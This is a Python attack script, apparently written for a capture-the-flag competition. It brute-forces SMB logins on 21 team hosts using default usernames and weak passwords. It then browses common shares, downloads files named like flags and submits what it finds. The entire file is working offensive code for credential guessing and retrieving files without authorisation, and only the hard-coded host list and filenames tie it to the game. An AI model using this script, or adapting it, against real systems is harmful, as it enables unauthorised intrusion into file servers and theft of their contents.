import time
from smb.SMBConnection import SMBConnection
from flag_sender import extract_flag, send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 445

USERS = ["guest", "test", "ubuntu", "admin", "ctf"]
PASSWORDS = ["", "guest", "1234", "admin", "ubuntu", "password", "toor"]

COMMON_SHARES = ["share", "public", "users", "tmp", "ctf", "flags"]
COMMON_FILES = ["flag.txt", "readme.txt", "flag", "FLAG", "ctf_flag.txt"]

def try_smb(ip, user, passwd):
    try:
        conn = SMBConnection(user, passwd, "attacker", "victim", use_ntlm_v2=True)
        if conn.connect(ip, port, timeout=5):
            return conn
    except Exception:
        return None
    return None

def search_flag(conn, ip):
    for share in COMMON_SHARES:
        try:
            files = conn.listPath(share, "/")
            for f in files:
                if f.filename.lower() in [x.lower() for x in COMMON_FILES]:
                    with open(f.filename, "wb") as out:
                        conn.retrieveFile(share, "/" + f.filename, out)
                    with open(f.filename, "r", errors="ignore") as inp:
                        text = inp.read()
                    flag = extract_flag(text)
                    if flag:
                        print(f"[+] Flag encontrada en {ip}: {flag}")
                        print(send_flag(flag))
                        return True
        except Exception:
            pass
    return False

def main():
    for ip in targets:
        print(f"[+] Probando {ip}:{port}")
        for user in USERS:
            for pwd in PASSWORDS:
                conn = try_smb(ip, user, pwd)
                if conn:
                    print(f"[+] Conexi√≥n SMB con {ip} usando {user}:{pwd}")
                    if search_flag(conn, ip):
                        conn.close()
                        break
                    conn.close()
        time.sleep(1)

if __name__ == "__main__":
    main()
